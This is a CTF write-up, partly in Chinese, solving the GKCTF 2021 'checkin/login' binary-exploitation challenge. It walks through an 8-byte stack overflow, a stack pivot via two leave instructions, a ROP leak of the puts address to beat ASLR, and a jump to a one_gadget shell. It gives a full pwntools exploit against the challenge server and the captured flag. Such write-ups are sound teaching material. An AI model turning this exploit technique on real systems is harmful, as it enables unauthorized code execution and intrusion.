# GKCTF 2021 checkin/login

> GKCTF 2021 https://buuoj.cn/plugins/ctfd-matches/matches/9/    **GKCTF X DASCTF应急挑战杯**
>
> challenge name: checkin
>
> file: login, libc.so.6
>
> .i64 with comments provided
>
> writeup writer: hexhex16@outlook.com    https://github.com/hex-16    thank liwl

1. 利用溢出的8B，修改rbp的值。而后经两次`leave`，rsp修改为指向name后地址，而后的ret读取name所属空间上的内容，导致rip可被修改至调用`main_logic`。
2. rsp修改为栈区地址后，使得`buf+0x20=name`，修改name缓冲区可控区域即可覆盖返回地址，修改至`pop edi; ret`，使得`edi = puts@got`再调用`puts`即可输出`puts`的真实地址，从而泄露libc基址(Anti ASLR)
3. 让step-2的puts为调用`main_logic`前的一个`puts`，那么泄露完`puts`真实地址后还能再执行一次`main_logic`，这时在name缓冲区上对应于返回地址的地方填入`one_gadget`，完成getshell



做题时绕的弯路：

- md5 hash算法不熟，纠结了半天md5加密部分的逻辑以及比对逻辑
- 一开始第一步返回的地址填的是`main_logic`的起始地址，即`payload = b"admin\0".ljust(0x8, b'\0') + p64(0x4018BF)`这一句用的地址是`0x4018C7`，导致buf+0x18 = name，仅有0x10 B空间构造ROP。即name: admin\0\0\0 + 浪费8B + RA + 8B可利用
- 远程pwn时，`one_gadget`选取错误，本地没有可用的ld.so。TBD: 学会从ubuntu docker中拉取对应版本的ld.so



# IDA Logic Analysis

- .text:00000000004018C7 处的函数(称为`main_logic`)，包含的是程序的主要逻辑
- 需注意的是buf长度为 0x20，输入限制为0x28，可覆盖8B。除开头的`admin\0`外为可控区域（后续会分析）
- name长度为0x20，除一开始的admin外，剩余缓冲区为可控区域，后续会利用。

```c
// 主要逻辑在这个函数里
int main_logic()  // .text:00000000004018C7
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  puts("Please Sign-in");
  putchar('>');
  read(0, s1, 0x20uLL);
  puts("Please input u Pass");
  putchar('>');
  read(0, buf, 0x28uLL);                        // 栈溢出 溢出长度为8B
  if ( strncmp(s1, "admin", 5uLL) || (unsigned int)sub_401974(buf) )//输入是否合法的判断
  {
    puts("Oh no");
    exit(0);
  }
  puts("Sign-in Success");
  return puts("BaileGeBai"); // 这里的ret只能控制rbp, 两次leave后控制rsp 修改name后空余空间 为本函数前的地址
}
```

- 在输入是否合法的判断中，会判断用户名name / s1是否为admin，并判断buf(密码)的md5值是否与一个固定的字符串相等。
- 这个固定的字符串在IDA中显示的与实际用的不同，需要根据比对逻辑，恢复成对比的顺序，然后查他的原文

```assembly
21232F297A57A5A743894A0E4A801FC3
admin # https://www.cmd5.com/ 查询结果
```

也就是说，name(s1)和buf(passwd)都得是admin才能到`main_logic`的`ret`，但是缓冲区大于`admin`长度，则输入可以是`admin\0`+`SomeThingSlse`

# Step-1: hijack rsp, ret to main_logic



# Step-2: Leak libc Address





# Step-3: one_gadget









# Exploit

```python
from pwn import *  # GKCTF 2021 checkin/login  https://github.com/hex-16

# v40 = "A7A5577A292F2321"  # 21232F297A57A5A7
# v41 = "C31F804A0E4A8943"  # 43894A0E4A801FC3
# "21232F297A57A5A743894A0E4A801FC3"

# one_gadget = 0x45226 # 0x4527a 0xf03a4 0xf1247
context.log_level = "DEBUG"

context.binary = './login'
sh = process("./login")  # , env={'LD_PRELOAD': './libc.so.6'}
# process(['ld.so','pwn'],env=xxx)
sh = remote("node3.buuoj.cn", 27490)
libc = ELF("./libc.so.6")
elf = ELF("./login")
# gdb.attach(sh, "b *(0x401972)\nb *(0x40191C)\nc")

# ===== step-1 控制rbp 进而控制rsp rip, 跳转回主要逻辑所在的函数 call 0x4018C7 的地址 0x4018BF
# 用前面的地址0x4018BF是为了让buf name地址差0x20（调试可得）多一个call = 多一个push
payload = b"admin\0".ljust(0x8, b'\0') + p64(0x4018BF)  # name 输入限制0x20
sh.sendafter(">", payload)
payload = b"admin\0".ljust(0x20, b'\0') + p64(0x602400)  # pw 输入限制0x28 # 修改rbp的值 第二次leave修改rsp的值
sh.sendafter(">", payload)

# buf/rsp 0x6023e0  +0x20 = s1 name 602400 # name + 8为返回地址
# ===== step-2 构造ROP 泄露puts真实地址 得到libc基址 并返回到main_logic里再执行一次
# payload: p64(pop rdi, ret) p64(puts@got) p64(0x4018B5) # 0x4018B5
# 如果buf偏移量并非+0x20=name, 则buf写入后不做操作可能会把name覆盖掉 导致判断时Oh no
# 0x401ab3 : pop rdi ; ret
payload = b"admin\0".ljust(0x8, b'\0') + p64(0x401ab3) + p64(elf.got['puts']) + p64(0x4018B5)
sh.sendafter(">", payload)
payload = b"admin\0".ljust(0x8, b'\0')
sh.sendafter(">", payload)

data = sh.recvuntil("GeBai\n")
addr_puts = u64(sh.recvline(keepends=False).ljust(8, b'\0'))
print("addr_puts=", hex(addr_puts))
libc.address = addr_puts - libc.sym['puts']
print("libc.address =", hex(libc.address))

# ===== step-3 ret to one_gadget RA可控原因：name可控区域包含返回地址
payload = b"admin\0".ljust(0x18, b'\0') + p64(libc.address + 0xf1247)  # gdb调试 让地址放在RA处
# 具体用哪一个one_gadget不清楚 远程蒙的 0xf1247蒙对了 可用
sh.sendafter(">", payload)
payload = b"admin\0".ljust(0x8, b'\0')
sh.sendafter(">", payload)


sh.interactive()  # then cat flag.txt at server
# flag{9c2090bf-8a0b-4785-9577-c34f070903a4}
```

- `flag{9c2090bf-8a0b-4785-9577-c34f070903a4}`

